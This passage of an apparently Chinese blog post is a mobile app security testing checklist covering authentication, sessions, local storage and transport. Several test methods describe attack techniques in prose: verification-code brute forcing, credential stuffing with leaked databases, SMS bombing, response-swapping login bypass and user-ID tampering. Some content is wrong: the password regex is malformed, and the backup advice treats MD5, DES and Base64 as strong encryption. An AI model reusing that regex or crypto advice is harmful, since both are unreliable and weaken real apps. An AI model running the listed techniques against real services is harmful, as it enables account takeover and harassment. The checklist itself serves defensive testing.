检测App是否私自开启HTTP服务，是否进行身份认证</li><li> 通过nmap工具扫描，检测App代码中是否开放某个TCP端口</li></ol></li><li><p>检测结论</p><p> 如App私自开启了HTTP服务，开放某个TCP端口，同时该服务无身份认证，则本测试 <strong>不通过</strong> </p></li><li><p>修复建议</p><p> App关闭HTTP服务和端口，增加App的访问权限控制机制</p></li></ol><p><a id="org414f599"></a></p><h1 id="鉴权认证安全测试-接口端口、内存数据、网络通信"><a href="#鉴权认证安全测试-接口端口、内存数据、网络通信" class="headerlink" title="鉴权认证安全测试 - 接口端口、内存数据、网络通信"></a>鉴权认证安全测试 - 接口端口、内存数据、网络通信</h1><p><a id="orgf61b415"></a></p><h2 id="注册过程测试"><a href="#注册过程测试" class="headerlink" title="注册过程测试"></a>注册过程测试</h2><p><a id="orge9b7dc3"></a></p><h3 id="注册信息保护检测"><a href="#注册信息保护检测" class="headerlink" title="注册信息保护检测"></a>注册信息保护检测</h3><ol><li><p>检测目的</p><p> 检测App注册密码的复杂度(密码内容要求字母大小写、数字、特殊字符组合，长度等)和注册信息在本地存储时的保护程度是否足够高</p></li><li><p>检测方法</p><ol><li><p>检测App注册密码的复杂度</p><pre><code> public static boolean isPasswordChecked(CharSequence data)&#123;     return Pattern.compile(&quot;^((a-z0-9A-Z)+[_]?)&#123;6,20&#125;$&quot;).matcher(data).find(); &#125;</code></pre></li><li><p> 检测App在本地存储的注册信息是否加密存储，加密密钥是否进行了隐藏处理</p></li></ol></li><li><p>检测结论</p><p> 如果对注册密码复杂度、长度进行了限制处理，且对本地存储的注册信息进行了加密保护，加密密钥隐藏，则通过测试</p></li><li><p>修复建议</p><ul><li>  对注册密码的复杂度和长度进行限制</li><li>  对在本地存在的用户注册信息进行加密处理，隐藏加密密钥</li></ul></li></ol><p><a id="org61850ac"></a></p><h3 id="注册信息传输检测"><a href="#注册信息传输检测" class="headerlink" title="注册信息传输检测"></a>注册信息传输检测</h3><ol><li><p>检测目的</p><p> 检测App将用户注册信息传输到服务器端的过程中是进行了加密保护</p></li><li><p>检测方法</p><p> 使用Burpsuite拦截App注册用户的数据包，查看数据包是否加密</p></li><li><p>检测结论</p><p> 若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试</p></li><li><p>修复建议</p><p> 在将用户注册信息传输到服务器端的过程中，对用户注册信息进行加密处理</p></li></ol><p><a id="org155ab47"></a></p><h3 id="注册过程防爆破检测"><a href="#注册过程防爆破检测" class="headerlink" title="注册过程防爆破检测"></a>注册过程防爆破检测</h3><ol><li><p>检测目的</p><p> 检测App在注册账户时，是否可以爆破获取正确的验证码，注册任意用户</p></li><li><p>检测方法</p><p> 在注册界面填写完注册信息后，点击&ldquo;获取验证码&rdquo;，使用抓包工具对其抓包，对数据包中的验证码进行暴力破解，爆破成功后，便可注册任意账号</p></li><li><p>检测结论</p><p> 若在注册App时验证码被爆破，可以任意注册账户，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  使用复杂的验证码，验证码长度不低于6位，包含数字及字母</li><li>  对发送验证码请求进行时间和次数限制</li><li>  验证码在传输时进行有效的加密处理</li></ul></li></ol><p><a id="org0f50b35"></a></p><h3 id="注册过程防嗅探检测"><a href="#注册过程防嗅探检测" class="headerlink" title="注册过程防嗅探检测"></a>注册过程防嗅探检测</h3><ol><li><p>检测目的</p><p> 检测在App注册过程中是否可以利用已有社工库中的手机号、邮箱、用户名、密码等信息，通过撞库方式频繁嗅探注册账户</p></li><li><p>检测方法</p><p> 利用Burpsuite拦截注册用户时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数，进行撞库，从而获取用户注册</p></li><li><p>检测结论</p><p> 若在注册时暴露账户、密码参数，具有利用撞库对用户注册信息进行嗅探的风险，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  对传输的注册账户、密码等敏感信息进行强加密处理</li><li>  服务器端限制访问次数</li></ul></li></ol><p><a id="org1371bd6"></a></p><h2 id="登陆过程测试"><a href="#登陆过程测试" class="headerlink" title="登陆过程测试"></a>登陆过程测试</h2><p><a id="orga447a0e"></a></p><h3 id="密码安全验证检测"><a href="#密码安全验证检测" class="headerlink" title="密码安全验证检测"></a>密码安全验证检测</h3><ol><li><p>检测目的</p><p> 检测App登陆密码的验证方案是在本地验证还是在服务器端验证，验证过程中是否加入了设备信息</p></li><li><p>检测方法</p><p> 利用JEB逆向分析App登陆功能的源码，分析密码验证中是否加密了设备信息IMEI</p></li><li><p>检测结论</p><p> 若密码验证在服务器端进行，且加入了设备信息，避免在非法设备登陆，则通过测试</p></li><li><p>修复建议</p><p> App登陆密码在服务器端进行验证，并加入设备信息，以降低用户登陆密码泄露的风险</p></li></ol><p><a id="orgf9ae294"></a></p><h3 id="登陆信息加密传输检测"><a href="#登陆信息加密传输检测" class="headerlink" title="登陆信息加密传输检测"></a>登陆信息加密传输检测</h3><ol><li><p>检测目的</p><p> 检测App在将用户登录信息传输到服务器端的过程中是否进行了加密保护，以免被攻击者拦截网络流量，窃取用户登陆信息</p></li><li><p>检测方法</p><p> 使用Burpsuite拦截app登陆操作的数据包，分析是否明文传输用户信息</p></li><li><p>检测结论</p><p> 若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试</p></li><li><p>修复建议</p><p> App在将用户登陆信息传输到服务器端的过程中，要对用户登陆信息进行加密处理</p></li></ol><p><a id="org5300a15"></a></p><h3 id="登陆过程防爆破检测"><a href="#登陆过程防爆破检测" class="headerlink" title="登陆过程防爆破检测"></a>登陆过程防爆破检测</h3><ol><li><p>检测目的</p><p> 检测App在登录时，是否可以抓取数据包，利用数据包中的验证码字段/密码字段进行暴力破解</p></li><li><p>检测方法</p><p> 检测App在登陆时，是否可以爆破验证码/密码，获取正确的验证码和登陆密码</p></li><li><p>检测结论</p><p> 若App在登陆时验证码和登陆密码可以被爆破，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  使用复杂的验证码和登陆密码</li><li>  对发送验证码的请求进行时间和次数限制</li><li>  对验证码、登陆密码进行输入错误次数限制</li><li>  验证码、登录密码在传输时进行有效的加密处理</li></ul></li></ol><p><a id="org771fe4a"></a></p><h3 id="登陆过程防嗅探检测"><a href="#登陆过程防嗅探检测" class="headerlink" title="登陆过程防嗅探检测"></a>登陆过程防嗅探检测</h3><ol><li><p>检测目的</p><p> 检测App是否可以通过爆破验证码实现任意账户登陆、任意重置用户密码等操作</p></li><li><p>检测方法</p><ol><li>验证码爆破检测<br> 在登陆界面填写完手机号等信息后点击“获取验证码”，使用抓包工具对其抓包，对数据中的验证码进行暴力破解，爆破成功后便可实现登陆任意账户、任意重置用户密码</li><li>短信轰炸检测<br> 在登陆界面填写完手机号等信息后点击“获取验证码”，若短信验证码无获取时间、获取次数限制，便可重放发送短信验证码数据进行短信轰炸</li><li>探测是否具有撞库风险<br> 利用工具拦截用户登陆时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数进行撞库，从而获取用户登陆信息</li></ol></li><li><p>检测结论</p><p> 若App通过爆破验证码实现登陆任意账户、任意重置用户密码、短信炸弹，或通过撞库获取用户登陆信息，则此项测试 <strong>不通过</strong> </p></li><li><p>修复建议</p><ul><li>  使用复杂验证码、登陆密码</li><li>  对发送验证码的请求进行时间和次数限制</li><li>  对验证码输入错误次数进行限制</li><li>  验证码在传输时进行有效的加密处理</li><li>  服务端限制访问次数</li></ul></li></ol><p><a id="orgbc121bd"></a></p><h3 id="登陆过程防绕过检测"><a href="#登陆过程防绕过检测" class="headerlink" title="登陆过程防绕过检测"></a>登陆过程防绕过检测</h3><ol><li><p>检测目的</p><p> 检测App是否可以绕过验证码登陆任意账户、修改用户ID获取其他用户信息</p></li><li><p>检测方法</p><ol><li> 抓取登陆成功后的响应包，之后退出，在登陆其他用户账户时，用登陆成功的响应包替换登陆失败的数据包，检测是否可以绕过验证码、密码验证，进而成功登陆其他用户的账户</li><li> 修改用户ID，检测是否可以获取任意用户信息，若用户身份认证采用单一ID值判断，攻击者可以修改数据包中的用户ID进行重放，从而获取其他用户信息</li></ol></li><li><p>检测结论</p><p> 若App可以绕过验证码登陆其他用户，或可以修改用户ID获取其他用户信息，则本项测试 <strong>不通过</strong></p></li><li><p>修复建议</p><p> 加强身份验证机制，使用Token或Session机制，设置访问控制策略，敏感数据采用高强度加密传输</p></li></ol><p><a id="orgabc9a4b"></a></p><h3 id="加强认证检测"><a href="#加强认证检测" class="headerlink" title="加强认证检测"></a>加强认证检测</h3><ol><li><p>检测目的</p><p> 检测App客户端是否具有双因子认证机制，保护用户登陆信息</p></li><li><p>检测方法</p><ol><li> 检测App在登陆时，是否具有双因子认证机制(密码+令牌/指纹/设备信息/短信)</li><li> 使用用户登陆信息在新设备登陆时，查看是否具有短信提醒</li></ol></li><li><p>检测结论</p><p> 如Apple具有双因子认证机制和不同设备登录时的短信提醒认证机制，则通过测试</p></li><li><p>修复建议</p><p> App采用双因子认证机制和不同设备登陆短信提醒认证机制，保护用户登陆信息安全</p></li></ol><p><a id="orgfefe1c8"></a></p><h2 id="会话过程测试"><a href="#会话过程测试" class="headerlink" title="会话过程测试"></a>会话过程测试</h2><p><a id="orgf7b44a1"></a></p><h3 id="有状态会话标志检测"><a href="#有状态会话标志检测" class="headerlink" title="有状态会话标志检测"></a>有状态会话标志检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器端交互的会话，是否存在复杂的会话ID，同时服务器是否对其进行校验</p></li><li><p>检测方法</p><ol><li> 模拟客户端与服务器端登陆，查看是否采用 <strong>简单的<sub>Session</sub><sub>id方式标识</sub></strong> 客户端</li><li> 利用服务端返回的 <strong>_Session<sub>id构建新的URL</sub></strong> 访问服务器端，查看是否能够绕过验证</li><li> 查看客户端与服务器交互时是否采用 *复杂的Key*，是否存在时间有效性校验，防止被伪造</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端会话时采用来复杂加密的Key，同时服务器端对客户端发送的Key进行了校验，攻击这无法伪造，服务器端无响应，则通过测试</p></li><li><p>修复建议</p><p> 客户端与服务器端通信会话时采用复杂的算法对随机的<sub>Session</sub><sub>id进行加密</sub>，同时服务器端对随机的<sub>Session</sub><sub>id进行校验</sub></p></li></ol><p><a id="org9be6f93"></a></p><h3 id="无状态会话Token检测"><a href="#无状态会话Token检测" class="headerlink" title="无状态会话Token检测"></a>无状态会话Token检测</h3><ol><li><p>检测目的</p><p> 在客户端与服务器端通信会话过程中，检测是否存在Token机制，是否容易被攻击者截取利用</p></li><li><p>检测方法</p><ol><li> 检测客户端与服务器端通信会话的URL中是否使用携带Token，Token是否明文显示</li><li> 检测客户端与服务器端认证的复杂性，是否采用类似 <strong>UID+Toekn+timestamp+密钥</strong> 的Toekn机制，并尝试破解</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端通信会话的Toekn能被轻易获取利用或被破解，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  每次登陆时重新生成Token，并设置有效期，每次操作后更新Token的时间戳，保证Token有效期往后延续</li><li>  为了避免Token被截获，伪造非法请求，在每次请求时，建议采用 <strong>UID+Token+timestamp+密钥+请求参数签名</strong> ，服务器同时验证Token和签名，以保证请求的安全性</li></ul></li></ol><p><a id="org1ce3ca7"></a></p><h3 id="会话不活跃检测"><a href="#会话不活跃检测" class="headerlink" title="会话不活跃检测"></a>会话不活跃检测</h3><ol><li><p>检测目的</p><p> 若客户端与服务器端通信临时终端或长时间不活跃，检测服务器是否立即终止会话</p></li><li><p>检测方法</p><ol><li> 在客户单与服务器端通信过程中，若长时间不操作，然后再操作时，查看客户端与服务器端是否已中断</li><li> 在客户单与服务器端通信过程中，若临时中断，例如打开微信等其他操作，让服务在后台运行，查看客户端与服务器端是否已中断</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端通信临时中断或长时间不活跃时，服务器端立即与客户端中断会话，需要重新认证，则本项测试结果为通过</p></li><li><p>修复建议</p><p> 在客户端与服务器端通信会话过程中，增加时间的有效性，例如设置时间为5min，若客户端与服务器长时间不活跃或者客户端服务在后台运行，服务器立即中断本次会话</p></li></ol><p><a id="org71ebb3f"></a></p><h3 id="加强认证检测-1"><a href="#加强认证检测-1" class="headerlink" title="加强认证检测"></a>加强认证检测</h3><ol><li><p>检测目的</p><p> 在客户端与服务器端进行敏感交易时，检测服务器端是否存在双因子身份认证机制</p></li><li><p>检测方法</p><ol><li> 检测客户端与服务器端进行支付、转账等敏感交易时，客户端是否需要多个身份认证方式，同时服务器端是否对其双因子进行校验</li><li> 检测客户端与服务器端进行身份认证过程中，数据是否进行加密处理，加密强度如何</li></ol></li><li><p>检测结论</p><p> 若客户端与服务器端存在双因子身份认证，则通过测试</p></li><li><p>修复建议</p><p> App中涉及敏感用户信息的界面，要求使用双因子身份认证机制，例如采用支付密码和用户预留短信验证码等认证方式</p></li></ol><p><a id="org783c152"></a></p><h2 id="登出过程测试"><a href="#登出过程测试" class="headerlink" title="登出过程测试"></a>登出过程测试</h2><p><a id="orga37a056"></a></p><h3 id="会话终止检测"><a href="#会话终止检测" class="headerlink" title="会话终止检测"></a>会话终止检测</h3><ol><li><p>检测目的</p><p> 在用户执行登出操作后，检测服务器端是否立即终止与客户端之间的会话连接</p></li><li><p>检测方法</p><ol><li> 登陆App，执行一些需要在App进行身份验证的操作，并拦截</li><li> 退出App</li><li> 重放步骤1中的操作，显示错误消息或重定向到登录页面</li></ol></li><li><p>检测结论</p><p> 若在客户端用户执行登出操作后，服务器立即终止与客户端之间的会话连接，需要用户重新进行登陆认证</p></li><li><p>修复建议</p><p> 在用户执行登出操作后，立即终止客户端与服务器端的会话连接</p></li></ol><p><a id="org22db691"></a></p><h3 id="残留数据检测"><a href="#残留数据检测" class="headerlink" title="残留数据检测"></a>残留数据检测</h3><ol><li><p>检测目的</p><p> 当用户执行登出操作后，检测服务器是否及时删除客户端对应的Token或<sub>Session</sub><sub>id</sub></p></li><li><p>检测方法</p><p> 操作客户端登出功能，通过用户名、密码、及之前的Token值或<sub>Session</sub><sub>id值能够登陆成功</sub>，则本项测试不通过</p></li><li><p>检测结论</p><p> 在用户执行登出操作后，若客户端使用之前的Token或<sub>Session</sub><sub>id值能够登陆成功</sub>，则本项测试不通过</p></li><li><p>修复建议</p><p> 当用户执行登出操作后，服务端及时删除户端对应的Token或<sub>Session</sub><sub>id值</sub></p></li></ol><p><a id="org13ec53d"></a></p><h2 id="注销过程测试"><a href="#注销过程测试" class="headerlink" title="注销过程测试"></a>注销过程测试</h2><p><a id="org643d8f5"></a></p><h3 id="重新注册检测"><a href="#重新注册检测" class="headerlink" title="重新注册检测"></a>重新注册检测</h3><ol><li><p>检测目的</p><p> 检测在客户端注销后，使用相同账户能否重新注册</p></li><li><p>检测方法</p><ol><li> 检测客户端是否存在注销功能</li><li> 在客户单注销之后，使用相同账户注册，查看是否可以重新注册，测试第三方关联的账户是否也已经注销，还能否正常登陆</li></ol></li><li><p>检测结论</p><p> 若注销账户后仍可以使用相同的账户注册，关联的第三方数据无法使用，则通过测试</p></li><li><p>修复建议</p><p> 在客户端注销操作后，可以使用相同账户重新注册，确认原来的账户信息已经清除</p></li></ol><p><a id="org0942197"></a></p><h3 id="数据清除检测"><a href="#数据清除检测" class="headerlink" title="数据清除检测"></a>数据清除检测</h3><ol><li><p>检测目的</p><p> 检测在App卸载后，本地存储的数据或账户缓存等信息是否全部清除</p></li><li><p>检测方法</p><ol><li> 安装App，先注册，登录试用，然后卸载，查看本地注册的用户账户信息等数据是否及时删除</li><li> 重新安装App，查看使用之前的账户和密码是否可以直接登陆</li></ol></li><li><p>检测结论</p><p> 若卸载App后，本地数据完全及时清除，则通过测试</p></li><li><p>修复建议</p><p> 在App卸载后，及时删除本地存储的全部数据</p></li></ol><p><a id="org8c9cd3a"></a></p><h1 id="本地数据安全测试-内存数据、本地存储"><a href="#本地数据安全测试-内存数据、本地存储" class="headerlink" title="本地数据安全测试 - 内存数据、本地存储"></a>本地数据安全测试 - 内存数据、本地存储</h1><p><a id="org0bb8c18"></a></p><h2 id="数据创建测试"><a href="#数据创建测试" class="headerlink" title="数据创建测试"></a>数据创建测试</h2><p><a id="org2f44160"></a></p><h3 id="用户协议检测"><a href="#用户协议检测" class="headerlink" title="用户协议检测"></a>用户协议检测</h3><ol><li><p>检测目的</p><p> 检测App是否存在用户协议声明。若存在，是否对使用用户信息用户及保护措施进行声明，是否存在违规行为</p></li><li><p>检测方法</p><ol><li> 安装运行App，试用App的所有主要功能，并抓包，通过数据包和源代码了解其行为特征</li><li> 查看是否存在用户协议，以及协议内容是否声明App需要手机的用户信息及保护措施</li></ol></li><li><p>检测结论</p><p> 若App存在用户服务协议，且声明了用户信息用途及保护措施，则通过测试</p></li><li><p>修复建议</p><p> App手机用户个人信息前，必须在用户服务协议中声明，需要收集用户设备的哪些信息、具体用途、及保护用户信息的安全措施和具体承诺</p></li></ol><p><a id="orgba2f37e"></a></p><h3 id="数据采集检测"><a href="#数据采集检测" class="headerlink" title="数据采集检测"></a>数据采集检测</h3><ol><li><p>检测目的</p><p> 检测App是否过度申请系统敏感权限，使用该权限时是否提示用户授权，是否过度手机用户数据，数据传输过程是否安全</p></li><li><p>检测方法</p><ol><li> 查看AndroidManifest.xml文件<users-permission>标签，分析App所申请的系统权限，是否存在过度申请的敏感权限</li><li> 查看App调用系统的敏感权限时是否提示用户授权</li><li> 分析App源码及数据包内容，查看是否过度收集在用户协议声明范围外的用户数据，确认数据传输过程中的安全性</li></ol></li><li><p>检测结论</p><p> 若App无过度申请系统敏感权限，且在使用该权限时提示用户授权，同时没有过度收集用户数据，则通过测试</p></li><li><p>修复建议</p><p> App发布时需要删除不需要的系统敏感权限，在申请系统敏感权限时，需要提示用户授权，不得私自上传在协议中未声明的用户信息</p></li></ol><p><a id="orga315219"></a></p><h3 id="数据输入检测"><a href="#数据输入检测" class="headerlink" title="数据输入检测"></a>数据输入检测</h3><ol><li><p>检测目的</p><p> 检测App是否实现了自带的安全键盘，且启动键盘时数字是否随机分布，关键的输入框是否禁用复制粘贴功能，是否存在验证码校验机制，验证码是否安全</p></li><li><p>检测方法</p><ol><li> 检测App是否实现了自定义软键盘，在每次启动时按键数字随机分布，且按键时不存在按键阴影，按键回显等特效</li><li> 检测要求输入敏感数据(登陆密码、支付密码、银行卡账户等)输入框禁用复制粘贴功能</li><li> 检测验证码是否由图形验证码或短信验证码组成，是否通过服务器端返回给客户端</li></ol></li><li><p>检测结论</p><p> 若App实现了自定义软键盘，键盘数字实现了随机分布，具有安全的验证码，同时密码输入框禁用了复制粘贴功能，则通过测试</p></li><li><p>修复建议</p><ul><li>  App客户端实现自定义的软键盘，软键盘每次启动时都要随机分布，且按键无回显、阴影等特效</li><li>  要求输入登陆、支付密码、银行卡账户等输入框禁用复制粘贴功能 设置 <code>android:longClickable=&quot;false&quot;</code> 关闭其功能</li><li>  增加复杂图形验证码或短信验证码，且在传输过程中对数据进行加密</li></ul></li></ol><p><a id="orga14671a"></a></p><h3 id="数据生成检测"><a href="#数据生成检测" class="headerlink" title="数据生成检测"></a>数据生成检测</h3><ol><li><p>检测目的</p><p> 检测App生成数据的存储形式时是结构话还是非结构话，数据是否经过加密后存储</p></li><li><p>检测方法</p><ol><li> 检测App生成的结构化数据，要求数据内容加密后存储</li><li> 检测App生成的非结构化数据，要求数据内容加密后存储</li></ol></li><li><p>检测结论</p><p> 若本地存储的数据经过加密处理，则通过测试</p></li><li><p>修复建议</p><p> 不管生成的数据是采用结构化还是非结构化形式存储，都要求加密后存储</p></li></ol><p><a id="org0e9c3ed"></a></p><h2 id="数据存储测试"><a href="#数据存储测试" class="headerlink" title="数据存储测试"></a>数据存储测试</h2><p><a id="org9fc890b"></a></p><h3 id="访问控制检测"><a href="#访问控制检测" class="headerlink" title="访问控制检测"></a>访问控制检测</h3><ol><li><p>检测目的</p><p> 检测App是否具备完善的权限管理机制，是否能够与其他App隔离，是否在权限允许的范围之外存在数据被其他客户端访问的风险</p></li><li><p>检测方法</p><p> 查看App本地存储文件的权限</p><pre><code> ls -al files        # 本地存储file文件权限 ls -al shared_pref  # 本地存储xml文件权限 ls -al app_webview  # 本地存储的cache文件权限 ls -al databases    # 本地存储的db文件权限</code></pre></li><li><p>检测结论</p><p> 如客户端具备完善的权限管理机制，以最小权限为原则，则通过测试</p></li><li><p>修复建议</p><p> App客户端严格控制本地生成敏感数据访问权限，避免被第三方App非法访问导致用户信息泄露</p></li></ol><p><a id="org717a8be"></a></p><h3 id="数据加密检测"><a href="#数据加密检测" class="headerlink" title="数据加密检测"></a>数据加密检测</h3><ol><li><p>检测目的</p><p> 检测App在本地存储的用户信息是否经过了加密处理，加密密钥是否进行了保护，加密算法是否合理，生成的随机数强度是否较高，避免造成用户信息泄露风险</p></li><li><p>检测方法</p><p> 检测App在本地生成的数据文件是否加密，检测App在本地存储的文件是否加密</p></li><li><p>检测结论</p><p> 若本地数据进行了加密处理，加密密钥进行了保护处理，且采用多种加密算法组合加密，对不同的数据采用了不同的加密算法，采用安全的方式生成随机数，则通过测试</p></li><li><p>修复建议</p><ul><li>  对App在本地存储的用户信息进行加密处理</li><li>  对对称加密算法的加密密钥进行加密保护和隐藏处理</li><li>  对APp在本地存储的用户信息进行多重加密，并对用户数据采用多种加密方式</li><li>  避免使用不安全的随机数生成类</li><li>  避免使用不安全的加密算法</li></ul></li></ol><p><a id="org80440e9"></a></p><h2 id="数据处理测试"><a href="#数据处理测试" class="headerlink" title="数据处理测试"></a>数据处理测试</h2><p><a id="org428e884"></a></p><h3 id="程序日志检测"><a href="#程序日志检测" class="headerlink" title="程序日志检测"></a>程序日志检测</h3><ol><li><p>检测目的</p><p> 检测App源码中的调试信息是否关闭，在调试信息中是否写入敏感信息</p></li><li><p>检测方法</p><ol><li><p>反编译源码，查看是否存在日志调试代码，要求不得存在日志调试代码</p><pre><code> private void save()&#123;     String mName=etUsername.getText().toString();     String mPwd=etPwd.getText().toString();     mEditor.putString(&quot;Name&quot;,mName);     mEditor.putString(&quot;Pwd&quot;,mPwd);     mEditor.commit();     Log.d(&quot;TEST&quot;,&quot;本地存储&quot;+&quot;用户名&quot;+mName+&quot;密码&quot;+mPwd); &#125;</code></pre></li><li><p> 动态运行App客户端，使用<del>logcat</del>查看后台打印日志是否存在用户敏感数据，要求后台不得打印日志调试信息</p></li></ol></li><li><p>检测结论</p><p> 若App关闭了源码中的调试信息，则通过测试</p></li><li><p>修复建议</p><p> App发布时应删除源码中的日志调试代码</p></li></ol><p><a id="orge80508d"></a></p><h3 id="敏感数据不当使用检测"><a href="#敏感数据不当使用检测" class="headerlink" title="敏感数据不当使用检测"></a>敏感数据不当使用检测</h3><ol><li><p>检测目的</p><p> 检测App源码和行为特征是否符合App安全相关标准的规定</p></li><li><p>检测方法</p><p> 反编译App代码，查看是否私自手机用户敏感信息，抓包拦截，检测是App是否私自上传用户隐私到服务器</p></li><li><p>检测结论</p><p> 逆向分析源码和数据包，若符合App安全相关标准的规定，则通过测试</p></li><li><p>修复建议</p><p> App源码要进行严格审核处理，禁止在用户未知情的情况下私自收集用户信息</p></li></ol><p><a id="org203f9e0"></a></p><h2 id="数据共享测试"><a href="#数据共享测试" class="headerlink" title="数据共享测试"></a>数据共享测试</h2><p><a id="orgdcc9854"></a></p><h3 id="第三方SDK用户协议检测"><a href="#第三方SDK用户协议检测" class="headerlink" title="第三方SDK用户协议检测"></a>第三方SDK用户协议检测</h3><ol><li><p>检测目的</p><p> 检测在App服务协议中是否声明第三方SDK收集用户信息的用途，是否过度收集用户个人信息</p></li><li><p>检测方法</p><p> 查看用户协议内容是否声明共享用户信息给第三方SDK，并通过抓包查看第三方SDK的行为特征</p></li><li><p>检测结论</p><p> 若用户协议中明确声明App信息与第三方共享情况，则通过测试</p></li><li><p>修复建议</p><p> App要明确声明是否会与第三方共享用户信息，以及共享用户信息的具体用途</p></li></ol><p><a id="org4e8592a"></a></p><h3 id="与第三方SDK数据共享检测"><a href="#与第三方SDK数据共享检测" class="headerlink" title="与第三方SDK数据共享检测"></a>与第三方SDK数据共享检测</h3><ol><li><p>检测目的</p><p> 检测App是否在用户未知情的情况下，私自共享用户个人信息给第三方SDK，以及第三方SDK是否私自收集用户个人信息到指定服务器</p></li><li><p>检测方法</p><ol><li> 分析App源码和数据包，查看是否在用户未知情的情况下，将收集的用户信息私自上传至第三方服务器</li><li> 分析App嵌入的第三方SDK源码和数据包，查看是否存在第三方SDK在用户不知情的情况下，将收集的用户信息私自上传至第三方服务器</li></ol></li><li><p>检测结论</p><p> 若分析源码内容和数据包后，符合App安全相关标准的规定，则通过测试</p></li><li><p>修复建议</p><p> 在App共享数据给第三方SDK的服务协议之外，禁止App和第三方SDK私自采用短信或数据包等形式，收集用户信息并上传到指定服务器</p></li></ol><p><a id="orgdbf7381"></a></p><h2 id="数据备份测试"><a href="#数据备份测试" class="headerlink" title="数据备份测试"></a>数据备份测试</h2><p><a id="orgbd332d3"></a></p><h3 id="敏感数据备份检测"><a href="#敏感数据备份检测" class="headerlink" title="敏感数据备份检测"></a>敏感数据备份检测</h3><ol><li><p>检测目的</p><p> 检测App应用数据是否可以备份，是否能够防止攻击者复制App数据</p></li><li><p>检测方法</p><p> 查看Androidmanifest.xml文件中的allowBackup属性是否为true<br> <code>&lt;application android:allowBackup=&quot;true&quot;</code></p></li><li><p>检测结论</p><p> 在App不具备备份功能的情况下，若 <code>&lt;application android:allowBackup=&quot;false&quot;</code> 则通过测试</p></li><li><p>修复建议</p><p> 在App不具备备份功能的情况下，应将 <code>&lt;application android:allowBackup=&quot;false&quot;</code> </p></li></ol><p><a id="org1c7a1d8"></a></p><h3 id="备份数据加密强度检测"><a href="#备份数据加密强度检测" class="headerlink" title="备份数据加密强度检测"></a>备份数据加密强度检测</h3><ol><li><p>检测目的</p><p> 检测App备份的数据是否进行加密处理，并且要求使用复杂的加密强度高的算法</p></li><li><p>检测方法</p><p> 若采用对称算法加密，则判断对称算法的密码是否存储安全，加密算法的源代码是否可以被破解</p></li><li><p>检测结论</p><p> 若App备份的数据进行了加密处理，则通过测试</p></li><li><p>修复建议</p><p> 采用多种混合算法加密，例如AES256,MD5,HASH,DES,BASE64</p></li></ol><p><a id="org1c83575"></a></p><h2 id="数据销毁测试"><a href="#数据销毁测试" class="headerlink" title="数据销毁测试"></a>数据销毁测试</h2><p><a id="org8a07238"></a></p><h3 id="后台运行数据检测"><a href="#后台运行数据检测" class="headerlink" title="后台运行数据检测"></a>后台运行数据检测</h3><ol><li><p>检测目的</p><p> 检测App客户端在切入后台运行时是否对收集存储的文件、数据库、配置文件、缓存文件等进行及时清理操作</p></li><li><p>检测方法</p><ol><li> App切入后台运行时，查看本地生成的db文件、xml文件或者内存中的数据是否进行了删除</li><li> 导出本地的缓存信息文件，查看是否有敏感信息暴露</li></ol></li><li><p>检测结论</p><p> 若App在切入后台运行时，本地生成的临时文件db、xml、cache中的数据或者运行时内存中的用户数据做到了及时清理，则通过测试</p></li><li><p>修复建议</p><p> App在切入后台运行后，应及时清理本地存储的用户敏感信息和内存中的数据信息</p></li></ol><p><a id="org57b8027"></a></p><h3 id="敏感数据清除检测"><a href="#敏感数据清除检测" class="headerlink" title="敏感数据清除检测"></a>敏感数据清除检测</h3><ol><li><p>检测目的</p><p> 检测App在退出或被卸载时，是否彻底删除在手机本地存储的文件、数据库、缓存、配置信息等文件</p></li><li><p>检测方法</p><p> 使用反编译工具apktool对目标文件进行反编译，查看App代码中是否具有清除缓存信息的方法 <code>removeSessionCookie()/deleteCookie()</code></p><pre><code> if(&quot;ClearWebView&quot; , &quot;webView.clearCache&quot;)&#123;     try&#123;         CookieSyncManager.createInstance(this.Y.getApplicationContext());         CookieSyncManager.getInstance().removeSessionCookie();         CookieSyncManager.getInstance().sync();     &#125;catch(Exception v0_1)&#123;     &#125; &#125;</code></pre></li><li><p>检测结论</p><p> 若本地生成文件仍然存在，则本项测试 <strong>不通过</strong></p></li><li><p>修复建议</p><p> 检测App在退出或被卸载时，应彻底删除在手机本地存储的文件、数据库、缓存、配置信息等信息</p></li></ol><p><a id="org3894cd3"></a></p><h1 id="网络传输安全测试-网络通信"><a href="#网络传输安全测试-网络通信" class="headerlink" title="网络传输安全测试 - 网络通信"></a>网络传输安全测试 - 网络通信</h1><p><a id="org2412456"></a></p><h2 id="安全传输层测试"><a href="#安全传输层测试" class="headerlink" title="安全传输层测试"></a>安全传输层测试</h2><p><a id="orgefeec07"></a></p><h3 id="TLS实现检测"><a href="#TLS实现检测" class="headerlink" title="TLS实现检测"></a>TLS实现检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器端交互核心的通信会话是否采用HTTPS，同时是否为现有最佳实践方式</p></li><li><p>检测方法</p><p> 使用Burpsuite/Wireshark抓包，判定用户登录、交易等私密连接是否使用HTTPS进行网络通信，查看TLS版本是否高于1.0</p></li><li><p>检测结论</p><p> 若客户端与服务器端通信采用HTTPS，且TLS版本高于1.0，则通过测试</p></li><li><p>修复建议</p><p> 客户端与服务器端核心的通信会话均采用HTTPS，同时TLS版本高于1.0</p></li></ol><p><a id="orgfb44226"></a></p><h3 id="CA证书检测"><a href="#CA证书检测" class="headerlink" title="CA证书检测"></a>CA证书检测</h3><ol><li><p>检测目的</p><p> 检测客户端与服务器建立安全通道时，客户端是否验证远程端点的X.509证书，是否只接受受信任的CA签名证书</p></li><li><p>检测方法</p><p> 检测CA证书的合法性，是否为受信任的CA签名证书，App是否只接受受信任的CA签名证书</p><ol><li> 抓取App与服务器端交互的数据，校验证书的颁发机构</li><li> 在源码中检查客户端是否只接受受信任的CA签名证书</li></ol></li><li><p>检测结论</p><p> 